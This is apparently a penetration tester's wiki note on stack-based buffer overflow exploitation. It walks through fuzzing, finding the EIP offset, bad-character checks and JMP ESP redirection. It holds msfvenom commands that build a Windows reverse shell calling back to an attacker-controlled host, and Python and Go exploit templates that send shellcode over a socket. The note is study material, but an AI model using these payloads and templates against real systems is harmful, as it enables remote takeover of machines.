# Stackbased Buffer Overflows

See [[Reverse-Engineering-Tools]], if using `gdb` get `gef`, just get `gef`.  For python scripts [[Stackbased-Buffer-Overflow-Scripts]]. 


## General Approach
Incremental stepping through your exploitation PoC on non-target environment to test **EACH** step to 

## Finding the vulnerability
1. Source code review
	1. Find vulnerable functions
2. [Fuzzing](https://en.wikipedia.org/wiki/Fuzzing)
	1.  Fuzz any input fields
3. Reverse Engineering
	1. Find vulnerable functions

Before getting excited consider if the target machine is protected with [[Binary-Exploitation-Protections]]

## Fuzzing HTTP protocol
[Microsoft TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview) if debugger network listening does not work.

1. Use [[Wireshark]] to monitor traffic sent to application and follow TCP stream to show reply. 
2. [[Useful_Python]] PoC 
3. Run debugger Administrative privileges attached to running of the vulnerable application
	1. Or for Windows [tcpview if immunity debugger listen column unavaliable](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview)
	2. Attach process with immunity debugger

## Buffer Overflow Exploitation
Be aware a lot of restarting required.

- Note the Endianess 
1. Enumerate till location EIP, - see fuzzer.py in [[Stackbased-Buffer-Overflow-Scripts]]
	1. Binary Tree analysis - use `pwntools` `cyclic` or `msf-pattern_create -l $int`
		1. `gdb badbin`
			1. `r <pattern>`
	2. Update PoC - see crash_replication_control_eip.py in [[Stackbased-Buffer-Overflow-Scripts]]
	3. Note ESP register points to before exploit.py

2. Check offset(skip binary tree analysis) with `msfpattern_offset -l $int -q $offsetpattern` or `pwntools` `offset`. From EIP the offset is located at relative memory address higher than EIP - closer to 0x0!. Or [[Mona]] and ImmunityDebugger use: `!mona findmsp -distance $msf_pattern_create_amount`
	1. Add EIP variable to find exact EIP address.
	 -  `gdb badin`
			1. `r (load of As)`
			2. `x/100x $esp`
			3. `x/100x $esp
3. Locating space for shellcode
4. Check for bad characters
5. Redirect the execution to flow: - Remember Endianess
	
Due address changing either due crashing-and-restarting application or ASLR ... we can just hardcode a static return address in general in modern binary exploitation.

6. Find a return address
7. Leverage a static address that contains a `JMP ESP`("jumps" to address pointed to by ESP) - we redirect EIP to this address
	1. Must be static - no libraries compiled with ASLR support
	2. Not an address within the region to be occupied by the shellcode
8. Encoded payloads from [[MSFVenom-Payloads]] are prepended with a decoder stub to decode itself using memory. GetPC routine assembly instruction to gather memory location of the decoder stub.
	1. shikata_ga_nai writes to top of the stack potentially corrupting the address pointed at by the ESP register meaning that the GetPC route execution changes the decoder itself.
	
To avoid this final issue you could:
1. Adjust ESP backward using assemble instructions _DEC ESP_, _SUB ESP, 0xXX_, before executing the decoder
2. Create large area for JMP ESP and NOP sled


## Considerations

1. One consideration depending on the application and the type of vulnerability, there may be restrictions on the length of input passed to the application. In some cases, increasing the length of a buffer may result in a completely different crash. This is due the larger buffer overwrites additional data on the stack that is used by the target application, but could provide extra space for shellcode.

2. Bad characters `-b` flag for [[MSFVenom-Payloads]] followed by a string of hex delimited with `\x`

3. Another being **ExitThread** API with [[MSFVenom-Payloads]] - `EXITFUNC=thread`:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10. LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
This avoid crashing the application when you terminate the shell.

4. Staging payload, if you do not have enough space create `stage` that would be equal to a set of opcodes to point to another address, you may require repadding the original buffer with `\x90`s to maintain the correct length.

5. To create the correct opcodes for assembly instructions, use `msf-nasm_shell` from [[Metasploit]].

6. `-v` variable to save as a variable name `-f py` format flag plus the py for python will format it to python variable.

7. Debugger will catch the child process of spawn the shell, remember not to have the debugger attached.

## Example workflow

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

fuzzbof.py
```bash
msf-pattern_create -l $int
```

enumeip.py
```powershell
!mona findmsp -distance $int
# Right Click -> Copy full line of EIP
```
No mona:
```bash
msf-pattern_offset -q $eip_address 
```

enumbadchars.py
```powershell
# use brain see CPU 
# address to which the ESP register point
!mona compare -f C:\mona\$bin\bytearray.bin -a $address
# Collect and deduce bad chars, remember corrupt to next byte so double check with updated enumbadchars.py
```

`!mona jmp -r esp -cpb "$badchars"`
If need to:
`ctrl + g` go to `$esp_address`
`f2` breakpoint on `$esp_address`
Step into  `F7`

`msfvenom -p windows/shell_reverse_tcp -a x$arch LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b $badchars -f py -v shellcode`


## Tooling
[[Tools/Binary-Exploitation-Tools/Pwntools]], see [[Reverse-Engineering-Tools]]
[[Immunity-Debugger-Helpsheet]] and [[Mona]]


## Appendix

\\xCC as a graceful break for binex than crashing.

// ENDIANNESS tester
```c
#include <stdio.h>
union s{
	int n;
	char b;
}x;
void main(){
	x.n = 0x4142;
	if(x.b == 0x42){
		printf("Little Endian\n");
	}
	else{
		printf("Big Endian\n");
	}
}
```

#### Templates 

```go
bof := strings.Builder{}
shell := ` `

offset := 608
rip := '0x' //store it to not overflow your own memory
formatRIP := //nice formatting hex function
nopSled := `\x90` 
safeJunk := `\xCC`
* someamount
payloadSize := offset + 8
shellSize := len(shell)
nopSize := len(nopSled)
padding := 'A' * (payloadSize - shellSize - nopSize)

bof.WriteString(nopSled, shell, padding, formatRIP)

payload := bof.String()

fmt.Printf("%s", payload)
```

```python
#!/usr/bin/python
import socket

host = "<ip_address>"
port = <port_number_as_int>

nop_sled = "\x90" * <nop_sled_size>

# stick the msfvenom payload command here for reference
shellcode = ""
... # Shellcode goes here


padding = "\x41" * (<padding_size_as_int> - len(nop_sled) - len(shellcode))

eip = "<eip_hex_address>" # remember endianness
stager = "<insert_opcodes_here>" # msf-nasm_shell to create opcode

buffer = f"<useful_string_if_required >{padding}{eip}{stager}\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")

s.connect((host, port))
print(f"{s.recv(1024)}")

s.send(buffer)
s.close()

print("[*] Payload Sent !")
```